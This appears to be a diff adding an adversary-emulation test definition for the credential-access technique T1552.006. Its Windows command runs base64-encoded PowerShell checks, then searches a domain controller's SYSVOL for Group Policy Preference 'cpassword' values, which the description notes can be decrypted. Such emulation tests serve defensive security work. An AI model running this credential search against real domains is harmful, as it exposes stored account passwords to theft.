@@ -1,0 +1,16 @@
+- id: 527dfaf5-6a16-5ba7-b800-6e9241d159df
+  name: Soumaia ART Tests - GPP Passwords (findstr)
+  description: Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller. This value can be decrypted with gpp-decrypt on Kali Linux.
+  tactic: credential-access
+  technique:
+    attack_id: T1552.006
+    name: 'Unsecured Credentials: Group Policy Preferences'
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACgAKABHAGUAdAAtAEMASQBNAEkAbgBzAHQAYQBuAGMAZQAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AQwBvAG0AcAB1AHQAZQByAFMAeQBzAHQAZQBtACkALgBQAGEAcgB0AE8AZgBEAG8AbQBhAGkAbgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAEoAbwBpAG4AaQBuAGcAIAB0AGgAaQBzACAAYwBvAG0AcAB1AHQAZQByACAAdABvACAAYQAgAGQAbwBtAGEAaQBuACAAbQB1AHMAdAAgAGIAZQAgAGQAbwBuAGUAIABtAGEAbgB1AGEAbABsAHkACgA=
+          )
+          findstr /S cpassword %logonserver%\sysvol\*.xml
